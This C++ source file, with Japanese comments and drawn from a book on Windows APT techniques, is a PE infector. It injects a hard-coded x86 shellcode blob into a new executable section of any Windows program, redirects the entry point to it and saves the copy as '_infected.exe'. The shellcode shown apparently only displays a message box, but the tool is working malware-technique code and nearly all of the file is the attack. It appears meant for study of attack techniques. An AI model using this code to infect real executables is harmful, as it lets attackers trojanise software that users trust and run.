// Referenced: https://github.com/PacktPublishing/Windows-APT-Warfare

#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996)

// 挿入したいシェルコード
char x86_nullfree_msgbox[] =
    "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
    "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
    "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
    "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
    "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
    "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
    "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
    "\x49\x0b\x31\xc0\x51\x50\xff\xd7";

// ファイルを読み込んで、バッファに格納する
bool readBinFile(const char fileName[], char **bufPtr, DWORD &length)
{
    // ファイルが開けたら
    if (FILE *fp = fopen(fileName, "rb"))
    {
        // まずは終端へ
        fseek(fp, 0, SEEK_END);
        // いまの位置を取得＝ファイルのサイズとなる
        length = ftell(fp);

        // バッファのアドレス上にサイズだけの配列を作って
        *bufPtr = new char[length + 1];
        // 先頭に戻して
        fseek(fp, 0, SEEK_SET);
        // ファイルの先頭からサイズ分バッファに読みだす
        fread(*bufPtr, sizeof(char), length, fp);
        return true;
    }
    // ファイルが開けなかったら
    return false;
}

int main(int argc, char **argv)
{
    // 引数チェック
    if (argc != 2)
    {
        puts("[!] usage: ./PE_Patcher.exe [path/to/file]");
        return 0;
    }

    // ファイルをbuffに読みだす
    char *buff;
    DWORD fileSize;
    if (!readBinFile(argv[1], &buff, fileSize))
    {
        puts("[!] selected file not found.");
        return 0;
    }

// NTヘッダのポインタを取得するマクロ
#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))
// セクションヘッダのポインタを取得するマクロ
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))
// セクションサイズが中途半端なものはAlignUpしたサイズを返すマクロ
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))

    puts("[+] malloc memory for outputed *.exe file.");
    size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment,
           fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment,
           // パッチ後のファイルサイズはShellCodeのサイズをFileAlignmentでAlighUpしたサイズだけ増える
        finalOutSize = fileSize + P2ALIGNUP(sizeof(x86_nullfree_msgbox), fileAlign);
    // パッチ後のファイルサイズだけ領域を確保
    char *outBuf = (char *)malloc(finalOutSize);
    // まずはオリジナルのファイルの中身をそのサイズでコピー
    memcpy(outBuf, buff, fileSize);

    puts("[+] create a new section to store shellcode.");
    // パッチ後のファイルを作るバッファでセクションヘッダを取得
    auto sectArr = getSectionArr(outBuf);
    // 最後のセクションヘッダを取得
    PIMAGE_SECTION_HEADER lastestSecHdr = &sectArr[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1];
    // 最後のセクションヘッダの次にShellCodeのセクションをパッチする
    PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1;
    // 追加したセクションヘッダに情報を入れていく
    memcpy(newSectionHdr->Name, "30cm.tw", 8);
    // メモリ上にロードしたときのサイズは、ShellCodeをSectionAlignmentでAlignUpしたサイズ
    newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), sectAlign);
    // メモリ上にロードしたときのアドレスは、もともとのファイルの最後のセクションのImageBaseからの相対距離＋セクションのサイズをAlignUpしたもの
    newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign);
    // ファイル上のサイズは、ShellCodeのサイズそのまま（これAlignUpしなくていいの？）
    newSectionHdr->SizeOfRawData = sizeof(x86_nullfree_msgbox);
    // 追加したいセクションデータの位置は、オリジナルファイルの最後のセクションデータの位置＋最後のセクションデータのサイズ
    newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData;
    // 権限としてRWXをつける
    newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
    // パッチ後のファイルにおけるセクション数を1増やしておく
    getNtHdr(outBuf)->FileHeader.NumberOfSections += 1;

    // パッチ後のファイルに追加したセクションデータにShellCodeをコピー
    puts("[+] pack x86 shellcode into new section.");
    memcpy(outBuf + newSectionHdr->PointerToRawData, x86_nullfree_msgbox, sizeof(x86_nullfree_msgbox));

    // 各セクションのメモリ上のサイズも修正、次にあるセクションとそのセクションのImageBaseからの相対アドレスの差分をとる
    puts("[+] repair virtual size. (consider *.exe built by old compiler)");
    for (size_t i = 1; i < getNtHdr(outBuf)->FileHeader.NumberOfSections; i++)
        sectArr[i - 1].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - 1].VirtualAddress;

    // メモリ上にロードされるときのサイズも修正、追加したセクションのImageBaseからの相対的なサイズ＋追加したセクションのメモリ上のサイズ
    puts("[+] fix image size in memory.");
    getNtHdr(outBuf)->OptionalHeader.SizeOfImage =
        getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].VirtualAddress +
        getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].Misc.VirtualSize;

    // ExtryPointは新しく追加したセクションのメモリ上のアドレス
    puts("[+] point EP to shellcode.");
    getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress;

    // 追加したセクションを含むバッファの内容をファイルに書き出し
    char outputPath[MAX_PATH];
    memcpy(outputPath, argv[1], sizeof(outputPath));
    strcpy(strrchr(outputPath, '.'), "_infected.exe");
    FILE *fp = fopen(outputPath, "wb");
    fwrite(outBuf, 1, finalOutSize, fp);
    fclose(fp);

    printf("[+] file saved at %s\n", outputPath);
    puts("[+] done.");
    return 0;
}